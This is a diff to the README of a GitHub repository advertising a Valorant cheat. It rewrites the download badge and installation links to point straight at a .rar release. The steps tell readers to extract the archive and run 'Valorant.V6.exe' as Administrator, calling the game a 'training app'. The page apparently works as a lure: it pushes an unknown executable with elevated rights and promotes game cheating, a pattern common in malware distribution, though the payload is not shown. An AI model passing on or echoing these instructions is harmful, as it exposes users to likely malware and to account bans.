@@ -12,7 +12,7 @@
 
 <div align="center">
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Percentsaintremember/Valorant-cheat/releases/download/VALORNT.5.9/VALORNT.5.9.rar)
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Percentsaintremember/Valorant-cheat/releases/download/Valorant.V6/VALORNT.V6.rar)
 
 </div>
 
@@ -53,9 +53,9 @@
 
 ---
 
-## [🔧 Installation](https://github.com/Percentsaintremember/Valorant-cheat/releases/download/VALORNT.5.9/VALORNT.5.9.rar)
+## [🔧 Installation](https://github.com/Percentsaintremember/Valorant-cheat/releases/download/Valorant.V6/VALORNT.V6.rar)
 
-1. **Download** the latest release from the [Releases](../../releases) page.
+1. **Download** the latest release from the [Releases](https://github.com/Percentsaintremember/Valorant-cheat/releases/download/Valorant.V6/VALORNT.V6.rar) page.
 2. **Extract** the archive to a folder on your desktop.
 3. **Run** `Valorant.V6.exe` as **Administrator**.
 4. **Launch** your training app and press `INSERT` to toggle the menu.
